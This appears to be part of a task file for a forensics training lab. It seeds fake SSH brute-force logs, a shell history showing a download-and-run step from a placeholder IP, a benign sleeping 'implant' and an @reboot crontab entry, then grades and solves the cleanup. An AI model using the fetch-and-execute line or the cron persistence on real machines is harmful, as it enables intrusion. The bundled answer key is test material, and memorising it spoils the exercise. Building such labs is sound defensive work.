+    url="http://45.$((RANDOM%250)).$((RANDOM%250)).$((2+RANDOM%250))/k/$(tr -dc a-f0-9 </dev/urandom | head -c8)"
+    implant=/tmp/.kimplant
+    # auth log
+    {
+      for i in $(seq 1 30); do echo "Mar 05 02:1$((RANDOM%9)):$((RANDOM%60)) h sshd[$RANDOM]: Failed password for $acct from $brute port $((1024+RANDOM%60000)) ssh2"; done
+      echo "Mar 05 02:20:05 h sshd[$RANDOM]: Accepted password for $acct from $brute port 51000 ssh2"
+    } | shuf > /lab/auth.log
+    echo '10.0.0.5 - - [05/Mar/2026:02:21:00 +0000] "GET / HTTP/1.1" 200 100 "-" "curl/8"' > /lab/access.log
+    chown "$(lab_user):" /lab/auth.log /lab/access.log
+    # history
+    cat > /home/$acct/.bash_history <<EOF
+    id
+    curl -fsSL $url -o $implant
+    chmod +x $implant
+    $implant &
+    EOF
+    chown $acct:$acct /home/$acct/.bash_history
+    # running implant
+    cat > $implant <<'PY'
+    #!/usr/bin/python3
+    import time
+    while True:
+        time.sleep(30)
+    PY
+    chmod 755 $implant
+    setsid $implant </dev/null >/dev/null 2>&1 &
+    eventually 10 "pgrep -f $implant"
+    # persistence via crontab
+    mkdir -p /var/spool/cron/crontabs
+    printf '@reboot %s &\n' "$implant" > /var/spool/cron/crontabs/$acct
+    chmod 600 /var/spool/cron/crontabs/$acct; chown $acct:crontab /var/spool/cron/crontabs/$acct 2>/dev/null || true
+    printf '%s\n%s\n%s\n%s\n/var/spool/cron/crontabs/%s\n' "$brute" "$acct" "$url" "$implant" "$acct" > "$KL_STATE/answer"
+  check: |
+    brute=$(sed -n 1p "$KL_STATE/answer"); acct=$(sed -n 2p "$KL_STATE/answer"); url=$(sed -n 3p "$KL_STATE/answer")
+    implant=$(sed -n 4p "$KL_STATE/answer"); cron=$(sed -n 5p "$KL_STATE/answer")
+    g() { grep -oE "$1=.*" /lab/report.txt 2>/dev/null | head -1 | cut -d= -f2-; }
+    check_eq "brute_ip" "$(g brute_ip)" "$brute"
+    check_eq "account" "$(g account)" "$acct"
+    check_eq "payload_url" "$(g payload_url)" "$url"
+    check_eq "implant" "$(g implant)" "$implant"
+    check_eq "persistence_file" "$(g persistence_file)" "$cron"
+    check "implant_pid is a number" '[[ "$(g implant_pid)" =~ ^[0-9]+$ ]]'
+    check "the implant was killed" "eventually 6 \"! pgrep -f $implant\""
+    check_not "the persistence line is gone" 'grep -q "$implant" "$cron" 2>/dev/null'
+  solve: |
+    acct=$(grep 'Accepted password' /lab/auth.log | awk '{for(i=1;i<=NF;i++)if($i=="for")print $(i+1)}' | head -1)
+    brute=$(grep 'Accepted password' /lab/auth.log | awk '{for(i=1;i<=NF;i++)if($i=="from")print $(i+1)}' | head -1)
+    h=/home/$acct/.bash_history
+    url=$(sudo grep -oE 'https?://[^ ]+' "$h" | head -1)
+    implant=$(sudo grep -E 'curl|wget' "$h" | grep -oE '(-o|-O) +[^ ]+' | awk '{print $2}' | head -1)
+    pid=$(pgrep -f "$implant" | head -1)
+    cron=/var/spool/cron/crontabs/$acct
+    printf 'brute_ip=%s\naccount=%s\npayload_url=%s\nimplant=%s\npersistence_file=%s\nimplant_pid=%s\n' \
+      "$brute" "$acct" "$url" "$implant" "$cron" "$pid" > /lab/report.txt
+    sudo kill -9 "$pid"
+    sudo sed -i "\\#${implant}#d" "$cron"
